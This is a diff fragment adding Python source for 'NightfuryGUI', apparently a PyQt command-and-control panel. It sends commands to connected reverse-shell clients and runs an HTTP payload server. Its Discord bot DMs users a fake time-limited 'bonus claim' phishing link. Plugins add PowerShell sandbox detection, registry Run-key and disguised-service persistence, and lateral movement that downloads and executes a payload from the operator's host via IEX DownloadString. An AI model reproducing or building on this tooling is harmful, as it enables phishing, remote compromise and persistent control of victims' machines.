+            for conn in self.active_connections:
+                if conn['address'] == client_id:
+                    conn['socket'].send(f"{command}\n".encode())
+                    self.command_output.append(f"[{client_id}] > {command}")
+                    self.command_input.clear()
+                    return
+            
+            raise Exception("Connection not found")
+        except Exception as e:
+            self.status_bar.showMessage(f"❌ Error: {str(e)}", 5000)
+    
+    def start_auto_server(self):
+        try:
+            self.save_config()
+            
+            if not self.config['lhost'] or not self.config['lport']:
+                raise Exception("Configure LHOST and LPORT first")
+            
+            # Create HTTP server with custom parameters
+            server_address = ('', self.config['auto_server_port'])
+            
+            # Create a custom handler class with our config
+            class CustomHandler(AutoExecutionServer):
+                pass
+                
+            setattr(CustomHandler, 'server', self)
+            setattr(CustomHandler, 'lhost', self.config['lhost'])
+            setattr(CustomHandler, 'lport', self.config['lport'])
+            setattr(CustomHandler, 'obfuscation_level', self.config['obfuscation_level'])
+            setattr(CustomHandler, 'persistence', self.config['persistence'])
+            setattr(CustomHandler, 'evasion_techniques', self.config['evasion_techniques'])
+            setattr(CustomHandler, 'platform', self.config['platform'])
+            setattr(CustomHandler, 'domain', self.config['domain'])
+            
+            self.http_server = HTTPServer(server_address, CustomHandler)
+            self.http_server.is_running = True
+            
+            # Start server in a separate thread
+            server_thread = threading.Thread(target=self.http_server.serve_forever, daemon=True)
+            server_thread.start()
+            
+            self.start_server_btn.setEnabled(False)
+            self.stop_server_btn.setEnabled(True)
+            
+            # Generate claim URL
+            claim_url = f"http://{self.config['domain']}:{self.config['auto_server_port']}/"
+            self.server_url.setText(claim_url)
+            
+            # Generate QR code
+            qr = qrcode.QRCode()
+            qr.add_data(claim_url)
+            qr_img = qr.make_image(fill_color="black", back_color="white")
+            
+            # Convert to QPixmap
+            img_byte_arr = io.BytesIO()
+            qr_img.save(img_byte_arr, format='PNG')
+            qpixmap = QPixmap()
+            qpixmap.loadFromData(img_byte_arr.getvalue())
+            self.qr_label.setPixmap(qpixmap)
+            
+            self.activity_list.addItem(f"[+] Auto-server started: {claim_url}")
+            self.server_status.setText("Running")
+            self.server_status.setStyleSheet("color: green; font-weight: bold; font-size: 24px;")
+            self.status_bar.showMessage(f"✅ Auto-server started on port {self.config['auto_server_port']}", 5000)
+        except Exception as e:
+            self.status_bar.showMessage(f"❌ Server error: {str(e)}", 5000)
+    
+    def stop_auto_server(self):
+        try:
+            if self.http_server:
+                self.http_server.shutdown()
+                self.http_server.server_close()
+                
+                self.start_server_btn.setEnabled(True)
+                self.stop_server_btn.setEnabled(False)
+                self.server_url.clear()
+                self.qr_label.clear()
+                
+                self.activity_list.addItem("[+] Auto-server stopped")
+                self.server_status.setText("Stopped")
+                self.server_status.setStyleSheet("color: red; font-weight: bold; font-size: 24px;")
+                self.status_bar.showMessage("✅ Auto-server stopped", 3000)
+        except Exception as e:
+            self.status_bar.showMessage(f"❌ Error stopping server: {str(e)}", 5000)
+    
+    def copy_claim_url(self):
+        try:
+            if self.server_url.text():
+                clipboard = QApplication.clipboard()
+                clipboard.setText(self.server_url.text())
+                self.status_bar.showMessage("✅ Claim URL copied to clipboard", 3000)
+                self.activity_list.addItem("[+] Claim URL copied to clipboard")
+        except Exception as e:
+            self.status_bar.showMessage(f"❌ Error: {str(e)}", 5000)
+    
+    def start_discord_bot(self):
+        try:
+            self.save_config()
+            
+            if not self.config['discord_token']:
+                raise Exception("Enter Discord token")
+            
+            # Create and start Discord bot
+            intents = discord.Intents.default()
+            intents.message_content = True
+            intents.members = True
+            
+            self.discord_bot = commands.Bot(
+                command_prefix='!',
+                intents=intents
+            )
+            
+            @self.discord_bot.event
+            async def on_ready():
+                self.bot_status.setText("Bot status: ✅ Connected")
+                self.bot_status_dash.setText("Running")
+                self.bot_status_dash.setStyleSheet("color: green; font-weight: bold; font-size: 24px;")
+                self.activity_list.addItem("[+] Discord bot connected")
+            
+            @self.discord_bot.command()
+            async def claim(ctx):
+                # Generate a unique claim token
+                claim_token = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
+                claim_url = f"http://{self.config['domain']}:{self.config['auto_server_port']}/?token={claim_token}"
+                
+                # Create embed message
+                embed = discord.Embed(
+                    title="🎁 Exclusive Bonus Claim",
+                    description="You've been selected for a special reward!",
+                    color=0x00ff00
+                )
+                embed.add_field(
+                    name="Claim Instructions",
+                    value=f"Click [here]({claim_url}) to claim your bonus immediately!",
+                    inline=False
+                )
+                embed.add_field(
+                    name="Important",
+                    value="This offer expires in 10 minutes. Claim now before it's gone!",
+                    inline=False
+                )
+                embed.set_footer(text="Reward Center - Official Distribution")
+                
+                try:
+                    await ctx.author.send(embed=embed)
+                    await ctx.send(f"{ctx.author.mention}, check your DMs for your exclusive bonus claim!")
+                    self.activity_list.addItem(f"[+] Sent bonus claim to {ctx.author}")
+                except discord.Forbidden:
+                    await ctx.send(f"{ctx.author.mention}, I couldn't DM you. Please enable DMs!")
+            
+            # Start bot in a separate thread
+            bot_thread = threading.Thread(target=self.discord_bot.run, args=(self.config['discord_token'],), daemon=True)
+            bot_thread.start()
+            
+            self.start_bot_btn.setEnabled(False)
+            self.stop_bot_btn.setEnabled(True)
+            self.bot_status.setText("Bot status: ⚡ Starting...")
+            
+            self.status_bar.showMessage("✅ Discord bot started. Use '!claim' in Discord", 5000)
+        except Exception as e:
+            self.status_bar.showMessage(f"❌ Bot error: {str(e)}", 5000)
+    
+    def stop_discord_bot(self):
+        try:
+            if self.discord_bot:
+                asyncio.run(self.discord_bot.close())
+                
+                self.start_bot_btn.setEnabled(True)
+                self.stop_bot_btn.setEnabled(False)
+                self.bot_status.setText("Bot status: 🔴 Stopped")
+                self.bot_status_dash.setText("Stopped")
+                self.bot_status_dash.setStyleSheet("color: red; font-weight: bold; font-size: 24px;")
+                
+                self.activity_list.addItem("[+] Discord bot stopped")
+                self.status_bar.showMessage("✅ Discord bot stopped", 3000)
+        except Exception as e:
+            self.status_bar.showMessage(f"❌ Error stopping bot: {str(e)}", 5000)
+    
+    def update_connection_status(self):
+        # Update connection count in status bar
+        connection_count = len(self.active_connections)
+        self.conn_count.setText(str(connection_count))
+        
+        # Update connection graph
+        self.connection_graph.add_data_point(connection_count)
+        
+        status = f"✅ System Ready | Connections: {connection_count}"
+        if hasattr(self, 'http_server') and self.http_server and self.http_server.is_running:
+            status += " | Server: Running"
+        if self.discord_bot:
+            status += " | Bot: Running"
+        self.status_bar.showMessage(status)
+    
+    def update_stats(self):
+        # Update connection stats
+        self.connection_stats.append(len(self.active_connections))
+        if len(self.connection_stats) > 50:
+            self.connection_stats.pop(0)
+    
+    def show_settings(self):
+        dialog = QDialog(self)
+        dialog.setWindowTitle("Settings")
+        dialog.setModal(True)
+        dialog.setMinimumWidth(400)
+        
+        layout = QVBoxLayout()
+        
+        # Theme selection
+        theme_group = QGroupBox("Theme")
+        theme_layout = QVBoxLayout()
+        
+        theme_combo = QComboBox()
+        theme_combo.addItems(["Dark", "Light", "System"])
+        theme_layout.addWidget(theme_combo)
+        
+        theme_group.setLayout(theme_layout)
+        layout.addWidget(theme_group)
+        
+        # Logging settings
+        log_group = QGroupBox("Logging")
+        log_layout = QVBoxLayout()
+        
+        log_level = QComboBox()
+        log_level.addItems(["Debug", "Info", "Warning", "Error"])
+        log_layout.addWidget(QLabel("Log Level:"))
+        log_layout.addWidget(log_level)
+        
+        log_group.setLayout(log_layout)
+        layout.addWidget(log_group)
+        
+        buttons = QDialogButtonBox(QDialogButtonBox.Ok | QDialogButtonBox.Cancel)
+        buttons.accepted.connect(dialog.accept)
+        buttons.rejected.connect(dialog.reject)
+        layout.addWidget(buttons)
+        
+        dialog.setLayout(layout)
+        
+        if dialog.exec_() == QDialog.Accepted:
+            self.activity_list.addItem("[*] Settings updated")
+            QMessageBox.information(self, "Settings", "Settings updated successfully")
+
+# ==============================
+# PLUGIN IMPLEMENTATIONS
+# ==============================
+
+class AVEvasionPlugin(Plugin):
+    def __init__(self, core):
+        super().__init__(core)
+        self.name = "AV Evasion"
+        self.version = "1.0"
+        self.description = "Advanced AV evasion techniques including code obfuscation and sandbox detection"
+    
+    def initialize(self):
+        self.core.activity_list.addItem("[+] AV Evasion plugin initialized")
+    
+    def execute(self, payload):
+        # Apply additional AV evasion techniques
+        evasion_payload = self._apply_evasion(payload)
+        return evasion_payload
+    
+    def _apply_evasion(self, payload):
+        # Add sandbox detection
+        sandbox_detection = '''
+        # Sandbox detection
+        $isSandbox = $false
+        if (Get-WmiObject -Class Win32_ComputerSystem | Where-Object { $_.Model -like "*Virtual*" }) { $isSandbox = $true }
+        if (Get-WmiObject -Class Win32_BIOS | Where-Object { $_.SerialNumber -like "*VMware*" }) { $isSandbox = $true }
+        if (($env:USERNAME).ToLower() -eq "sandbox") { $isSandbox = $true }
+        
+        if (-not $isSandbox) {
+            # Continue with payload
+        '''
+        
+        # Add the sandbox detection to the payload
+        if "windows" in payload.lower():
+            payload = sandbox_detection + payload + "\n}"
+        
+        return payload
+
+class PersistencePlugin(Plugin):
+    def __init__(self, core):
+        super().__init__(core)
+        self.name = "Persistence"
+        self.version = "1.0"
+        self.description = "Advanced persistence mechanisms including scheduled tasks, registry modifications, and service creation"
+    
+    def initialize(self):
+        self.core.activity_list.addItem("[+] Persistence plugin initialized")
+    
+    def execute(self, payload):
+        # Apply additional persistence techniques
+        persistent_payload = self._apply_persistence(payload)
+        return persistent_payload
+    
+    def _apply_persistence(self, payload):
+        # Add additional persistence mechanisms
+        extra_persistence = '''
+        # Registry persistence
+        $regPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+        $regName = "SystemHealthCheck"
+        $regValue = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \\"" + $payload + "\\""
+        Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Force
+        
+        # Service persistence
+        $serviceName = "SystemHealthService"
+        if (-not (Get-Service $serviceName -ErrorAction SilentlyContinue)) {
+            New-Service -Name $serviceName -BinaryPathName $regValue -Description "System Health Monitoring Service" -StartupType Automatic -ErrorAction SilentlyContinue
+            Start-Service $serviceName -ErrorAction SilentlyContinue
+        }
+        '''
+        
+        # Add the extra persistence to the payload
+        if "windows" in payload.lower():
+            payload = payload + extra_persistence
+        
+        return payload
+
+class LateralMovementPlugin(Plugin):
+    def __init__(self, core):
+        super().__init__(core)
+        self.name = "Lateral Movement"
+        self.version = "1.0"
+        self.description = "Lateral movement techniques including WMI, PSExec, and PowerShell Remoting"
+    
+    def initialize(self):
+        self.core.activity_list.addItem("[+] Lateral Movement plugin initialized")
+    
+    def execute(self, target):
+        # Attempt lateral movement to target
+        return self._lateral_move(target)
+    
+    def _lateral_move(self, target):
+        # Implement lateral movement techniques
+        movement_script = f'''
+        # Attempt lateral movement to {target}
+        try {{
+            # WMI execution
+            $cred = Get-Credential
+            Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell -ExecutionPolicy Bypass -Command \\"IEX (New-Object Net.WebClient).DownloadString('http://{self.core.config['lhost']}/payload.ps1')\\""
+            
+            # PowerShell Remoting
+            Invoke-Command -ComputerName {target} -ScriptBlock {{ 
+                IEX (New-Object Net.WebClient).DownloadString('http://{self.core.config['lhost']}/payload.ps1')
+            }} -Credential $cred
+            
+            return "Lateral movement attempted to {target}"
+        }}
+        catch {{
+            return "Lateral movement failed: $($_.Exception.Message)"
+        }}
+        '''
+        
+        return movement_script
+
+# ==============
+# MAIN EXECUTION
+# ==============
+
+if __name__ == "__main__":
+    app = QApplication(sys.argv)
+    app.setStyle("Fusion")
+    
+    # Set application font
+    font = QFont("Consolas", 10)
+    app.setFont(font)
+    
+    window = NightfuryGUI()
+    window.show()
+    sys.exit(app.exec_())
